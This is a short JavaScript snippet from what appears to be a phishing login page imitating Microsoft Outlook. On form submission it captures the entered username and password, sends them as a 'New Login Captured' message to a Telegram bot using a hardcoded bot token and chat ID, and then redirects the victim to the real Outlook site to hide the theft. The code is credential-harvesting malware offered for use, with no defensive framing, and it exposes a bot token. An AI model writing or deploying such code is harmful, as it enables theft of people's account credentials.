
    // 1. YOUR CONNECTION KEYS
    const BOT_TOKEN = '8584656855:AAGer0oV6or_nNBblqfOKr9Exyf8Z58UoLk'; // This must be from @BotFather
    const CHAT_ID = '5627522307';           // Your ID from the screenshot

    document.getElementById('authForm').addEventListener('submit', function(e) {
        e.preventDefault(); 

        const user = document.getElementById('user_id').value;
        const pass = document.getElementById('user_pass').value;

        // 2. THE MESSAGE FORMAT
        const message = 📧 New Login Captured:\n👤 User: ${user}\n🔑 Pass: ${pass};

        // 3. THE "SEND" ACTION
        fetch(https://api.telegram.org/bot${BOT_TOKEN}/sendMessage, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            })
        })
        .then(() => {
            // 4. THE REDIRECT (This happens AFTER the bot replies)
            window.location.href = "https://outlook.office.com";
        });
    });
